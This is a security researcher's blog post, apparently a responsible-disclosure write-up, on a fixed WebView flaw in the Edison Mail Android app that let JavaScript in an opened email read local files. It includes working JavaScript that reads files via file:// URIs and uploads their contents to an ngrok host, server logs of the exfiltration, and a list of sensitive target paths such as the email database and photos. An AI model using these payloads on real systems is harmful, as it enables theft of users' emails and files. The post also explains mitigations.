<!DOCTYPE html><html lang="en-us"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Abusing WebViews to Steal Files via Email</title><meta name="description" content="A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing: &lt;script&gt;&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><script type="text/javascript" async src="https://www.googletagmanager.com/gtag/js?id=G-DBS1YCNH9G"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];
				  function gtag(){dataLayer.push(arguments);}
				  gtag('js', new Date());
				  gtag('config', 'G-DBS1YCNH9G' , { 'anonymize_ip': true });</script><link rel="canonical" href="https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html"><link rel="alternate" type="application/atom+xml" href="https://sotoventura.com/feed.xml"><link rel="alternate" type="application/json" href="https://sotoventura.com/feed.json"><meta property="og:title" content="Abusing WebViews to Steal Files via Email"><meta property="og:image" content="https://sotoventura.com/media/posts/7/webview.svg"><meta property="og:site_name" content="Home"><meta property="og:description" content="A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing: &lt;script&gt;&hellip;"><meta property="og:url" content="https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@almostjson"><meta name="twitter:title" content="Abusing WebViews to Steal Files via Email"><meta name="twitter:description" content="A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing: &lt;script&gt;&hellip;"><meta name="twitter:image" content="https://sotoventura.com/media/posts/7/webview.svg"><link rel="stylesheet" href="assets/css/glitche-basic.css"><link rel="stylesheet" href="assets/css/glitche-layout.css"><link rel="stylesheet" href="assets/css/ionicons.css"><link rel="stylesheet" href="assets/css/magnific-popup.css"><link rel="stylesheet" href="assets/css/animate.css"><link rel="stylesheet" href="assets/css/default.css"><link href="https://fonts.googleapis.com/css?family=Roboto+Mono:400,100,300italic,300,100italic,400italic,500,500italic,700,700italic&amp;subset=latin,cyrillic" rel="stylesheet"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html"},"headline":"Abusing WebViews to Steal Files via Email","datePublished":"2019-08-25T12:00","dateModified":"2022-07-21T00:29","image":{"@type":"ImageObject","url":"https://sotoventura.com/media/posts/7/webview.svg","height":2800,"width":2800},"description":"A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing: &lt;script&gt;&hellip;","author":{"@type":"Person","name":"Jesson","url":"https://sotoventura.com/authors/test/"},"publisher":{"@type":"Organization","name":"Jesson"}}</script></head><body><div class="preloader"><div class="centrize full-width"><div class="vertical-center"><div class="pre-inner"><div class="load typing-load"><p>loading...</p></div><span class="typed-load"></span></div></div></div></div><header><div class="head-top"><a href="#" class="menu-btn"><span></span></a><div class="top-menu"><ul><li><a href="https://sotoventura.com/" class="lnk">Home</a></li><li><a href="https://sotoventura.com/blogs.html" class="lnk">Blogs</a></li><li><a href="https://sotoventura.com/whoami.html" class="lnk">Whoami</a></li></ul></div></div></header><main><div class="section started"><div class="centrize full-width"><div class="vertical-center"><div class="started-content"><div class="h-title blog_title">Abusing WebViews to Steal Files via Email</div><div>August 25th 2019</div></div></div></div></div><div class="section blog"><div class="content"><div class="single-post-text"></div><div class="section blog"><div class="content"><div class="single-post-text"><p>A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing:</p><pre class="code_wrapper"><code class="html language-html hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> alert(<span class="hljs-string">"Hi, It's almost lunch time"</span>) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre><p>It actually was close to lunch time, so I wrapped up testing and waited for the email to arrive in my inbox. Once it arrived, I opened my email client and checked the email, when all of a sudden I was met with this popup:</p><figure class="post__image align-center"><img loading="lazy" src="https://sotoventura.com/images/blogs/webview/alert.png" data-is-external-image="true" alt="Alert Message triggered via a malicious email" width="208" height="358"></figure><p>This was bad. At the time I was using Edison Mail as my primary email client. It offered a number of useful features including package tracking, easy integration with my calendar, and smart replies making it a useful email client. But as soon as I saw that popup, I knew I was going to have to go back to using Gmail. Getting this pop-up was bad. Even before seriously looking into the issue - I had a hunch that the impact of the issue could be serious.</p><h4 id="tldr" class="align-center">TL;DR:</h4><p>While using Edison Mail - I found that it would execute JavaScript stored inside of emails. This functionality could be abused to read files from user's external storage as well as all their emails. The contents of these files could then be uploaded to a remote server. All by only <strong>OPENING</strong> a malicious email.</p><h2 id="findingthedangerouswebviewssettings" class="align-center">Finding the dangerous WebViews Settings</h2><p>Android developers frequency use WebViews to incorporate web features into their applications. Normally, when developers use WebViews the default settings are used. Unfortunately, Edison Mail made a number of WebView changes that facilitated attacks against its users. Let's start off by finding the WebView changes made by Edison Mail.</p><p>As WebView settings are typically contained within the WebSettings class, we should be able to search the application's decompiled source for any invocations of the WebSettings class. A quick search turned up a number of settings changes made by the application.</p><p>Below are a three of the most dangerous settings that were enabled:</p><pre class="code_wrapper"><code class="java language-java hljs">setJavaScriptEnabled(<span class="hljs-keyword">true</span>)
setAllowFileAccessFromFileURLs(<span class="hljs-keyword">true</span>)
setAllowUniversalAccessFromFileURLs(<span class="hljs-keyword">true</span>)
</code></pre><p>Alone each of these settings is fairly benign, but together and put into the context of an email application each setting change was dangerous. In particular, the <strong>FileAccess</strong> settings were dangerous as they give contents inside the WebView access to local file, but I am getting a head of myself.</p><h2 id="abrieflessononwebviewsettings" class="align-center">A brief lesson on WebView Settings</h2><p>First, let's review the list of enabled WebView settings to understand a bit about each one.</p><p><strong>setJavaScriptEnabled</strong> - does exactly what the name implies and enables JavaScript to be executed inside of the WebView. It seems like this feature should be enabled by default since every developer and every application almost always seem to have this feature enabled. Alone this feature is benign, but when coupled with other setting changes it can be quite dangerous.</p><p><strong>SetAllowFileAccessFromFileURls</strong>- allows any JavaScript inside of files loaded using the File URI scheme (<strong>file:///</strong>) to request other resources using the file's URI. Now to fully appreciate how powerful this is, let's take a step back and discuss the File URI scheme.</p><p>Content can loaded into WebViews using a number of schemes. The most common is the Universal Resource Locator (URL), but other formats like the Data scheme also exist. In this case, the file scheme is a special scheme that allows a WebView to load local files. Applications typically use this scheme to load locally stored content into the WebView.</p><p>This is where the <strong>SetAllowFileAccessFromFileURLs</strong> comes into play. By default, file loaded using the File URI scheme are not able to load additional resources. Enabling the <strong>SetAllowFileAccessFromFileURLS</strong> lets them load other local resources using the File URI scheme.</p><p><strong>setAllowUniversalAccessFromFileURLs</strong> - allows JavaScript inside of files loaded using the File URI scheme to request resources using schemes other than the File URI scheme. Of the three setting changes made by Edison mail - this is the most dangerous. It disables a fundamentally important protection and allows local files to request resource using HTTP/S.</p><h2 id="testingwebviewswithgooglechrome" class="align-center">Testing WebViews with Google Chrome</h2><p>So far we know that the application is taking our emails and executing the JavaScript inside of our email. We also know that the application allows local file resources to request other resources, but we don't know if our JavaScript is being loaded as a file resource or using some other method. To answer that question, let's do some dynamic testing.</p><p>Testing WebViews is simple - we can leverage the <strong>setWebContentsDebuggingEnabled</strong> setting. This setting will let us connect to the WebView running on our device using Chrome. From there, it behaves like a normal web page and we can use Chrome's developer console to test the WebView.</p><p>But before we get to that stage, we need to enable setWebContentsDebuggingEnabled. To do this decompile the application and added this line of code to any of the applications' OnCreate methods preferably one that is triggered at launch:</p><pre class="code_wrapper"><code class="java language-java hljs"><span class="hljs-keyword">const</span>/<span class="hljs-number">4</span> v1, <span class="hljs-number">0x01</span>

invoke-<span class="hljs-keyword">static</span> {v1}, Landroid/webkit/WebView;-&gt;setWebContentsDebuggingEnabled(Z)V
</code></pre><p>The best part about this setting is that it is applied globally, so one call is all it takes to debug any newly created WebViews.</p><p>From here, we can connect our to Android device to our computer and navigate to <strong>chrome://inspect</strong> using Chrome. Once we open Edison Mail and it launches a WebView we should see it show up.</p><p><img loading="lazy" src="https://sotoventura.com/images/blogs/webview/WebView.png" data-is-external-image="true" alt="Debugging WebViews using Google Chrome"></p><p>Now we are ready to start poking around.</p><h2 id="timetostealsomefiles" class="align-center">Time to steal some files</h2><p>With our testing environment setup, let's see if we can break something. The first thing we need to do is review the context of the WebView. Chrome shows us this, before even opening the WebView.</p><p>Under <em>WebView in com.easilydo.mail</em> we see that there are a number of <strong>about:blank</strong> pages. This means that a local file is being used to render the email's content. It is not imminently apparent, but <strong>about:blank</strong> is just an alias for <strong>file:///android_asset</strong>. This means that we should be able to read arbitrary files from the device. Let's validate that.</p><p>Pasting the following code into the console:</p><pre class="code_wrapper"><code class="js language-js hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">filepath</span>)</span>{
  <span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();
  request.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>() </span>{
    <span class="hljs-keyword">var</span> t = <span class="hljs-keyword">new</span> XMLHttpRequest();
    <span class="hljs-built_in">console</span>.warn(<span class="hljs-keyword">this</span>.responseText);
  };
  xhttp.open(<span class="hljs-string">"GET"</span>, filepath, <span class="hljs-literal">false</span>);
  xhttp.send();
}

getfile(<span class="hljs-string">"file:///sdcard/test.file"</span>)
</code></pre><p>Gives us this the contents of /sdcard/test.file</p><p><img loading="lazy" src="https://sotoventura.com/blogs/readfile.png" data-is-external-image="true" alt="Example of reading files from the external SD Card">{.here}</p><p>Awesome - We were able to read the contents of a file stored on the user's external storage. The next step is to see if we can upload the contents of the files somewhere. Remember the <strong>setAllowUniversalAccessFromFileURLs</strong> flag? Normally, It would be prevent us from uploading files, but the setting was enabled. To perform a quick test, we can use the following code:</p><pre class="code_wrapper"><code class="js language-js hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadfile</span>(<span class="hljs-params">filepath, url</span>)</span>{
  <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();
  xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>() </span>{
  <span class="hljs-keyword">var</span> upload = <span class="hljs-keyword">new</span> XMLHttpRequest();
  upload.open(<span class="hljs-string">"GET"</span>, url + <span class="hljs-string">"?"</span> + <span class="hljs-keyword">this</span>.responseText , <span class="hljs-literal">false</span>)
  upload.send()
  };
  xhttp.open(<span class="hljs-string">"GET"</span>, filepath, <span class="hljs-literal">false</span>);
  xhttp.send();
}

uploadfile(<span class="hljs-string">"file:///sdcard/test.file"</span>, <span class="hljs-string">"http://3164c2ef.ngrok.io"</span>)
</code></pre><p>Gives us this the contents of /sdcard/test.file</p><p><img loading="lazy" src="https://sotoventura.com/images/blogs/webview/readfile.png" data-is-external-image="true" alt="Example of reading files from the external SD Card"></p><p>Awesome - We were able to read the contents of a file stored on the user's external storage. The next step is to see if we can upload the contents of the files somewhere. Remember the <strong>setAllowUniversalAccessFromFileURLs</strong> flag? Normally, It would be prevent us from uploading files, but the setting was enabled. To perform a quick test, we can use the following code:</p><p>A look over at the server and sure enough the file's contents was uploaded</p><pre class="code_wrapper"><code class="hljs plaintext"><span class="hljs-attribute">Serving</span> HTTP <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0</span> port <span class="hljs-number">3333</span> (http://0.0.0.0:3333/) ...
<span class="hljs-number">127.0.0.1</span> - - [<span class="hljs-number">12</span>/Aug/<span class="hljs-number">2019</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span>:<span class="hljs-number">15</span>] <span class="hljs-string">"GET /? HTTP/1.1"</span> <span class="hljs-number">200</span> -
<span class="hljs-number">127.0.0.1</span> - - [<span class="hljs-number">12</span>/Aug/<span class="hljs-number">2019</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span>:<span class="hljs-number">15</span>] <span class="hljs-string">"GET /?THIS%20FILE%20IS%20ON%20THE%20SDCARD?!?! HTTP/1.1"</span> <span class="hljs-number">200</span> 
</code></pre><p>It worked! So now we know that we are able to both read files from the filesystem and upload them to arbitrary sites. With this functionality, we could steal a number of sensitive files from a user - including:</p><ul><li>- All their emails, which are stored at: <strong>file:///data/data/com.easilydo.mail/databases/ko.db</strong></li><li>- All their pictures, which are stored at: <strong>file:///sdcard/DCIM</strong></li><li>- All files stored at<strong> file:///sdcard/*</strong></li></ul><p>What makes this entire attack more dangerous is the fact that it is possible to use the File URI scheme to traverse a directory. Finally, since the file uploads only stop once the user closes the application, it is possible to perform long running tasks like archiving and uploading all of a user's files. All that the attacker needs to do is convince the user to <strong>OPEN</strong> the email.</p><h2 id="protectingagainstfutureattacks" class="align-center">Protecting against future attacks</h2><p>If not properly secured, WebViews can be used to attack applications. However, these attacks typically rely on one or more of the following conditions existing:</p><ul><li>Resources being loaded from external storage</li><li>Third-party resources being loaded without domain white listing</li><li>Allowing JavaScript to be executed</li><li>Usage of dangerous JavaScript Interfaces</li><li>Modification of WebSettings to permit access to privileged data</li></ul><p>If any of the above conditions exist, than it may be possible to leverage one or more condition to gain a foothold inside of the WebView. As a precaution, we have see that a number of applications are performing the following actions to protect against WebView attacks:</p><ul><li>Applications that are caching content in external storage will store the hash of the file preventing cached files from being modified</li><li>Domains and resources are being white listed to prevent unknown third parties form interacting with the WebView</li><li>Applications will filter out dangerous JavaScript functions</li><li>Dangerous JavaScript functions will be overloaded and disabled</li><li>JavaScript interfaces are used sparely and assessed to ensure that they can not be abused</li></ul><p>Of the above solutions, Edison mail used the third approach to protecting their users. The application now filters out any dangerous scripts from the email prior to rendering it in a WebView. As of version 1.7.2 the application is no longer vulnerable to the payloads shared above.</p><p>For more details checkout the <a href="https://sotoventura.com/edison-mail-disclosure.html"><em>Edison Mail Disclosure</em></a><em> blog.</em></p></div></div></div></div></div></main><div class="line top"></div><div class="line bottom"></div><div class="line left"></div><div class="line right"></div><script src="assets/js/jquery.min.js"></script><script src="assets/js/jquery.validate.js"></script><script src="assets/js/typed.js"></script><script src="assets/js/magnific-popup.js"></script><script src="assets/js/masonry.pkgd.js"></script><script src="assets/js/imagesloaded.pkgd.js"></script><script src="assets/js/masonry-filter.js"></script><script src="assets/js/highlight.pack.js"></script><script src="assets/js/glitche-scripts.js"></script></body></html>